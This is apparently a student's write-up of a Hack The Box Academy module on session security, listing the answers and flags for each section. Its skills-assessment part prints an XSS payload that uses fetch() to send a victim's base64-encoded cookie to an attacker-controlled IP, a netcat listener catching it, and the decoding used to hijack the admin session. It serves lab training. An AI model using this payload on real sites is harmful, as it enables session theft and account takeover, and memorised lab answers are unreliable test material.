# Session Security
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Session Security
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 7 hours
* Date: 27-07-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Session Hijacking
### Question:
![](./attachments/Pasted%20image%2020220725115211.png)

![](./attachments/Pasted%20image%2020220725122711.png)

**Answer:** `cookie`

---
## Session Fixation
### Question:
![](./attachments/Pasted%20image%2020220725115239.png)

**Answer:** `Yes`

---
## Obtaining Session Identifiers without User Interaction
### Question:
![](./attachments/Pasted%20image%2020220725115311.png)

**Answer:** `Yes`

---
## Cross-Site Scripting (XSS)
### Question:
![](./attachments/Pasted%20image%2020220725115336.png)

**Answer:** `Yes`

---
## Cross-Site Request Forgery (CSRF or XSRF)
### Question:
![](./attachments/Pasted%20image%2020220725115413.png)


**Answer:** `Yes`

---
## Cross-Site Request Forgery (GET-based)
### Question:
![](./attachments/Pasted%20image%2020220725115440.png)

**Answer:** `Yes`

---
## Cross-Site Request Forgery (POST-based)
### Question:
![](./attachments/Pasted%20image%2020220725115529.png)

**Answer:** `Yes`

---
## XSS & CSRF Chaining
### Question:
![](./attachments/Pasted%20image%2020220725115551.png)

**Answer:** `Yes`

---
## Exploiting Weak CSRF Tokens
### Question:
![](./attachments/Pasted%20image%2020220725115616.png)

**Answer:** `Popup Blockers`

---
## Open Redirect
### Question:
![](./attachments/Pasted%20image%2020220725115638.png)

**Answer:** ``

---
## Skills Assessment
### Question 1:
![](./attachments/Pasted%20image%2020220725115741.png)

*Hint: Make the admin's profile public to see the flag*

Payload: 
```
<script>fetch(`http://10.10.14.225:8000?cookie=${btoa(document.cookie)}`)</script>
```

![](./attachments/Pasted%20image%2020220727110439.png)

Send the malicious link to the admin.

![](./attachments/Pasted%20image%2020220727111018.png)

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.14.225] from (UNKNOWN) [10.129.19.44] 60226
GET /?cookie=YXV0aC1zZXNzaW9uPXMlM0FtdHN3RzFfMW0zekRPN3BfTmc1WlpfQnBXeTZKTXZHdC5rMU1tUUtjZE44Q1Z6SG5kWjJzQzVjJTJCemhkNGlINEVuQUM5WFdwak9KdVk= HTTP/1.1
Host: 10.10.14.225:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 [258e2c35733847d0e90492bee74d19f8544c9d68]
Accept: */*
Origin: http://minilab.htb.net
Referer: http://minilab.htb.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Netcat recieved a cookie in base64 format.

```
┌──(kali㉿kali)-[~]
└─$ echo "YXV0aC1zZXNzaW9uPXMlM0FtdHN3RzFfMW0zekRPN3BfTmc1WlpfQnBXeTZKTXZHdC5rMU1tUUtjZE44Q1Z6SG5kWjJzQzVjJTJCemhkNGlINEVuQUM5WFdwak9KdVk=" | base64 -d
auth-session=s%3AmtswG1_1m3zDO7p_Ng5ZZ_BpWy6JMvGt.k1MmQKcdN8CVzHndZ2sC5c%2Bzhd4iH4EnAC9XWpjOJuY
```

We got a session cookie!

Insert it into the browser on order to hijack the session.

![](./attachments/Pasted%20image%2020220727111423.png)

Make public > share.

![](./attachments/Pasted%20image%2020220727111524.png)

**Answer:** `[YOU_ARE_A_SESSION_WARRIOR]`

### Question 2:
![](./attachments/Pasted%20image%2020220725115749.png)

Download the `.pcap` file.

Edit > Find Packet... > String > "flag"

![](./attachments/Pasted%20image%2020220727111706.png)

**Answer:** `FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}`

---

**Tags:** [[Hack The Box Academy]]